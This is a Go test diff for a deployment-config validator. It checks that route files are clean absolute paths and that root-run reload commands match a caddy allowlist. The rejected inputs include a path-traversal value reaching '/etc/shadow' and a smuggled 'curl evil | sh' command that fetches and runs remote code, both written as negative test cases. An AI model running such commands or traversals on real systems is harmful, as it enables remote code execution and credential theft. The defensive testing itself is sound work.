@@ -132,7 +132,7 @@ func TestValidateDeployments_RequiredByStrategy(t *testing.T) {
 
 func TestValidateDeployments_RelativePaths(t *testing.T) {
 	errs := ValidateDeployments(decodeDeployFixture(t, "relative_route.yml"))
-	if len(errs) != 1 || errs[0].Path != "deployments.production.route.file" || !strings.Contains(errs[0].Msg, "must be an absolute path") {
+	if len(errs) != 1 || errs[0].Path != "deployments.production.route.file" || !strings.Contains(errs[0].Msg, "must be an absolute, clean path") {
 		t.Fatalf("errors =\n%s", errorStrings(errs))
 	}
 
@@ -148,6 +148,50 @@ func TestValidateDeployments_RelativePaths(t *testing.T) {
 	} {
 		if !strings.Contains(got, want) {
 			t.Errorf("errors do not contain %q:\n%s", want, got)
+		}
+	}
+}
+
+// The agent writes route.file as root, so it must be a clean absolute path;
+// the agent checks it against its deploy.route_dirs when it applies a route.
+func TestValidateDeployments_RouteFileClean(t *testing.T) {
+	for file, wantErr := range map[string]bool{
+		"/etc/caddy/routes/../../shadow": true, "/etc/caddy/./app.caddy": true, "/etc/caddy/routes/": true, "routes/app.caddy": true,
+		"/etc/caddy/routes/app.caddy": false, "/opt/infrauno/shared/routes/timeuno.caddy": false,
+	} {
+		cfg := decodeDeployFixture(t, "valid_bluegreen.yml")
+		d := cfg.Deployments["production"]
+		d.Route.File = file
+		cfg.Deployments["production"] = d
+		errs := ValidateDeployments(cfg)
+		if got := len(errs) == 1 && errs[0].Path == "deployments.production.route.file"; got != wantErr || (!wantErr && len(errs) != 0) {
+			t.Errorf("route.file %q: errors =\n%s", file, errorStrings(errs))
+		}
+	}
+}
+
+// route.reload runs as root, so only caddy reload commands pass.
+func TestValidateDeployments_RouteReloadAllowlist(t *testing.T) {
+	for reload, wantErr := range map[string]bool{
+		"":                       false,
+		"systemctl reload caddy": false,
+		"caddy reload --config /etc/caddy/Caddyfile":                   false,
+		"/usr/bin/caddy reload":                                        false,
+		"/usr/local/bin/caddy reload":                                  false,
+		"docker exec caddy caddy reload --config /etc/caddy/Caddyfile": false,
+		"sh -c 'caddy reload; curl evil | sh'":                         true,
+		"docker exec -u root caddy caddy reload":                       true,
+		"docker exec caddy sh -c 'caddy reload'":                       true,
+		"caddy run":                                                    true,
+		`caddy reload --config "/etc/caddy`:                            true,
+	} {
+		cfg := decodeDeployFixture(t, "valid_bluegreen.yml")
+		d := cfg.Deployments["production"]
+		d.Route.Reload = reload
+		cfg.Deployments["production"] = d
+		errs := ValidateDeployments(cfg)
+		if got := len(errs) == 1 && errs[0].Path == "deployments.production.route.reload"; got != wantErr || (!wantErr && len(errs) != 0) {
+			t.Errorf("route.reload %q: errors =\n%s", reload, errorStrings(errs))
 		}
 	}
 }
